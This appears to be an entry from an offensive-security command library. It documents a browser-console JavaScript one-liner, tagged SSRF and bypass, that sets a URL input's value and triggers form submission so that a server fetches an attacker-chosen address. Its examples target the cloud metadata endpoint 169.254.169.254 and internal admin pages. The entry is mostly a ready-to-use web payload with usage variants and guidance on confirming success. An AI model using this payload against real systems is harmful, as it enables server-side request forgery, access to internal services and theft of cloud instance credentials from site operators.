---
id: 9cab5425-dc81-4b46-8ea3-8fd496b73d86
name: set-url-input-value-and-trigger-change
type: command
executor: javascript
data: >-
  document.querySelector('input[type=url]').value =
  'https://example.com/image.jpg';
  document.querySelector('input[type=url]').dispatchEvent(new Event('change'));
output: null
created_at: '2023-04-06T03:56:37.687052+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - ssrf
  - bypass
verified: true
validated: true
---

# set-url-input-value-and-trigger-change

## Command

```javascript
document.querySelector('input[type=url]').value = '$_TARGET_URL'; document.querySelector('input[type=url]').dispatchEvent(new Event('change'));
```

## Description

This JavaScript command sets a URL value in a modified input field and triggers the change event to initiate form submission, exploiting URL-based image uploads for SSRF. Run in the browser console after modifying the input type.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `$_TARGET_URL` | The URL to set (e.g., internal endpoint like http://localhost/admin) | Yes |
| `input[type=url]` | CSS selector for the URL input element | Yes |

## Examples

### Basic Usage

```javascript
document.querySelector('input[type=url]').value = 'http://169.254.169.254/latest/meta-data/'; document.querySelector('input[type=url]').dispatchEvent(new Event('change'));
```

### Advanced Usage (With Form Submit)

```javascript
document.querySelector('input[type=url]').value = '$_TARGET_URL'; document.querySelector('input[type=url]').dispatchEvent(new Event('change')); document.querySelector('form').submit();
```

## Expected Output

The input value updates, and the change event fires, submitting the form. Monitor the network tab for the server's request to $_TARGET_URL; success shows response data or image processing logs.

## Related

- [[procedures/SSRF-Image-Upload-Bypass-Using-Type-URL]]
